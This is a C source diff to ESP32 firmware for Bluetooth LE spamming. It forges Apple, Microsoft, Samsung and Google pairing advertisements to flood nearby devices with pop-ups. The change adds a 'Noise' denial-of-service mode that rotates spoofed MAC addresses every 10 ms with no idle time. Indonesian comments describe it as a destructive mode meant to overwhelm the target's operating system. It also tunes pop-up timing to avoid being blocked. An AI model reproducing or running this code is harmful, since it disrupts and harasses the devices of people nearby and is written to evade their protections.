@@ -259,6 +259,7 @@ static const char* spam_type_to_name(ble_spam_type_t type) {
         [BLE_SPAM_GOOGLE]      = "Google",
         [BLE_SPAM_FLIPPERZERO] = "Flipper",
         [BLE_SPAM_RANDOM]      = "Random",
+        [BLE_SPAM_AUDIO_DOS]   = "Noise",
     };
     if (type < sizeof(names) / sizeof(names[0])) return names[type];
     return "Unknown";
@@ -266,11 +267,15 @@ static const char* spam_type_to_name(ble_spam_type_t type) {
 
 static void generate_random_mac(uint8_t *mac) {
     esp_fill_random(mac, 6);
-    // Static random address: top two bits = 11
-    mac[5] |= 0xC0;
-    // BLE spec: not all bits in random part can be 0 or 1
-    if ((mac[0] | mac[1] | mac[2] | mac[3] | mac[4]) == 0) mac[0] = 0x01;
+    
+    // Bikin jadi Non-Resolvable Private Address biar kelihatan kayak perangkat asli
+    // 2 bit teratas dari byte MSB harus 00 (Sesuai spesifikasi BLE Privacy)
+    mac[5] &= 0x3F; 
+    
+    // Pastikan bit-nya tidak semuanya 0
+    if ((mac[0] | mac[1] | mac[2] | mac[3] | mac[4] | mac[5]) == 0) mac[0] = 0x01;
 }
+
 
 // ============================================================================
 // Apple Continuity packet builders
@@ -585,14 +590,17 @@ static void spam_task(void *arg) {
     (void)arg;
 
     while (spam_running) {
-        // --- Stop any active advertisement ---
+        // --- Stop active advertisement ---
         if (ble_gap_adv_active()) {
             ble_gap_adv_stop();
             vTaskDelay(pdMS_TO_TICKS(20));
         }
 
-        // --- Rotate MAC (not for Apple — Apple needs stable/public MAC) ---
+        // --- Deteksi Mode ---
         bool is_apple = (current_spam_type == BLE_SPAM_APPLE);
+        bool is_dos = (current_spam_type == BLE_SPAM_AUDIO_DOS); // Mode perusak
+
+        // --- Rotate MAC (not for Apple) ---
         if (!is_apple) {
             uint8_t rnd_addr[6];
             generate_random_mac(rnd_addr);
@@ -607,49 +615,38 @@ static void spam_task(void *arg) {
         // --- Build raw advertisement payload ---
         uint8_t adv_data[31];
         size_t adv_len = 0;
-
-        // Flags AD record prefix (3 bytes) — prepended for non-Apple types
-        // Apple Continuity packets are already self-contained and do not need
-        // a separate Flags record; adding one would push past 31 bytes for
-        // some packet types.
         bool need_flags = !is_apple;
 
         if (need_flags) {
-            adv_data[0] = 0x02; // length
-            adv_data[1] = 0x01; // AD type: Flags
-            adv_data[2] = 0x1A; // LE General Discoverable, BR/EDR not supported
+            adv_data[0] = 0x02; 
+            adv_data[1] = 0x01; 
+            adv_data[2] = 0x1A; 
             adv_len = 3;
         }
 
-        // Temporary buffer for the protocol-specific records
         uint8_t proto_buf[31];
         size_t  proto_len = 0;
 
         switch (current_spam_type) {
             case BLE_SPAM_APPLE:
-                // Apple continuity: write directly into adv_data (no flags prefix)
                 proto_len = build_apple_continuity_adv(adv_data);
                 adv_len   = proto_len;
                 break;
-
             case BLE_SPAM_MICROSOFT:
                 proto_len = build_swiftpair_adv(proto_buf);
                 break;
-
             case BLE_SPAM_SAMSUNG:
                 proto_len = build_samsung_adv(proto_buf);
                 break;
-
             case BLE_SPAM_GOOGLE:
             case BLE_SPAM_FLIPPERZERO:
                 proto_len = build_fastpair_adv(proto_buf);
                 break;
-
+            case BLE_SPAM_AUDIO_DOS: // Audio DoS pakai payload campur aduk
             case BLE_SPAM_RANDOM: {
                 switch (esp_random() % 4) {
                     case 0: proto_len = build_swiftpair_adv(proto_buf);  break;
                     case 1:
-                        // Apple — no flags, write direct
                         proto_len = build_apple_continuity_adv(adv_data);
                         adv_len   = proto_len;
                         need_flags = false;
@@ -661,7 +658,6 @@ static void spam_task(void *arg) {
             }
         }
 
-        // Append proto_buf to adv_data if we used the flags+proto path
         if (need_flags && proto_len > 0) {
             if (adv_len + proto_len <= 31) {
                 memcpy(&adv_data[adv_len], proto_buf, proto_len);
@@ -677,7 +673,6 @@ static void spam_task(void *arg) {
         // --- Set advertisement data ---
         int rc = ble_gap_adv_set_data(adv_data, adv_len);
         if (rc != 0) {
-            glog("Error: Failed to set adv data (%d)\n", rc);
             vTaskDelay(pdMS_TO_TICKS(50));
             continue;
         }
@@ -687,41 +682,66 @@ static void spam_task(void *arg) {
         memset(&adv_params, 0, sizeof(adv_params));
         adv_params.conn_mode  = BLE_GAP_CONN_MODE_NON;
         adv_params.disc_mode  = is_apple ? BLE_GAP_DISC_MODE_GEN : BLE_GAP_DISC_MODE_NON;
-        adv_params.channel_map = 0x07; // all three channels
+        adv_params.channel_map = 0x07; 
 
-        // Interval: use 20ms equivalent (0x20 = 20*0.625ms = 12.5ms, close enough)
-        // Apple uses slightly slower interval — it doesn't care about speed as much
-        if (is_apple) {
-            adv_params.itvl_min = 0x30; // ~30ms
+        if (is_dos) {
+            // Mode DoS: Rata kanan super cepat (Interval ~20ms)
+            adv_params.itvl_min = 0x20; 
+            adv_params.itvl_max = 0x20;
+        } else if (is_apple) {
+            // Mode Apple bawaan
+            adv_params.itvl_min = 0x30; 
             adv_params.itvl_max = 0x40;
         } else {
-            adv_params.itvl_min = 0x20; // ~20ms
-            adv_params.itvl_max = 0x28;
+            // Mode Pop-up Biasa: Dibikin kenceng (Interval ~40-60ms) tapi gak sampai kena blokir
+            adv_params.itvl_min = 0x0040; 
+            adv_params.itvl_max = 0x0060;
         }
 
         uint8_t own_addr_type = is_apple ? BLE_OWN_ADDR_PUBLIC : BLE_OWN_ADDR_RANDOM;
 
-        // Advertise for a short window then rotate
-        uint32_t adv_ms = is_apple ? 200 : ((esp_random() % 50) + 50);
+        // --- Tentukan Durasi Iklan ---
+        uint32_t adv_ms;
+        if (is_dos) {
+            // DoS: Ngiklan 10ms doang, MAC langsung ganti! (bikin OS target kalang kabut)
+            adv_ms = 10; 
+        } else if (is_apple) {
+            adv_ms = 200;
+        } else {
+            // Pop-up Biasa: Tahan 250-350ms per MAC. Ini batas teringan biar pop-upnya tetep tembus tapi layarnya bisa cepet ditumpuk pop-up baru
+            adv_ms = (esp_random() % 100) + 250; 
+        }
+
         rc = ble_gap_adv_start(own_addr_type, NULL, adv_ms, &adv_params, NULL, NULL);
         if (rc != 0) {
-            glog("Error: Failed to start adv (%d)\n", rc);
             vTaskDelay(pdMS_TO_TICKS(50));
             continue;
         }
 
         spam_adv_count++;
 
-        // Wait for advertisement window to expire
-        vTaskDelay(pdMS_TO_TICKS(adv_ms + 20));
+        // Tunggu iklan selesai
+        if (is_dos) {
+            vTaskDelay(pdMS_TO_TICKS(adv_ms)); // Gak ada tambahan delay tunggu
+        } else {
+            vTaskDelay(pdMS_TO_TICKS(adv_ms + 20));
+        }
 
         if (ble_gap_adv_active()) {
             ble_gap_adv_stop();
         }
 
-        // Short idle before next packet — mimic 20ms Flipper default
-        uint32_t idle_ms = is_apple ? 15 : 20;
-        vTaskDelay(pdMS_TO_TICKS(idle_ms));
+        // --- Tentukan Jeda Istirahat ---
+        uint32_t idle_ms;
+        if (is_dos) {
+            idle_ms = 0; // Mode DoS: TANPA NAFAS!
+        } else {
+            idle_ms = 15; // Mode pop-up: Kasih jeda napas super tipis aja biar paket gak di-drop
+        }
+
+        if (idle_ms > 0) {
+            vTaskDelay(pdMS_TO_TICKS(idle_ms));
+        }
     }
 
     if (ble_is_initialized() && ble_gap_adv_active()) {
